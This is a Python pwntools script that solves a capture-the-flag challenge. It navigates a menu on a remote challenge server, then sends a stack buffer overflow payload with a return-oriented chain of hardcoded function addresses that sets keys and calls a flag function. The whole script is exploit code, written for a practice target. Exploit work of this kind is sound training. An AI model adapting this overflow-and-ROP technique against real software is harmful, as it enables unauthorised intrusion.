from pwn import *

#p = process('challenge')
p = remote('challenges.auctf.com', 30012)

print p.recvrepeat(0.2)

p.sendline('2')

print p.recvrepeat(0.2)
p.sendline('4')

print p.recvrepeat(0.2)

p.sendline('3')

print p.recvrepeat(0.2)

p.sendline('Stephen')

print p.recvrepeat(0.2)


addr_getKey1 = 0x565566de 
argu_getKey1 = 0xFEEDC0DE
addr_popret = 0x5655601e

addr_getKey2 = 0x5655676e

addr_setKey3 = 0x565567cd
addr_setKey4 = 0x565567e9

addr_getFlag = 0x5655686b

#only local
#raw_input('Waiting for debugging ::: ' + str(p.pid))

p.sendline('a'*(0x18+4)+p32(addr_setKey3)+p32(addr_getKey2)+p32(addr_getKey1)+p32(addr_popret)+p32(argu_getKey1)+p32(addr_setKey4)+p32(addr_getFlag))

p.interactive()
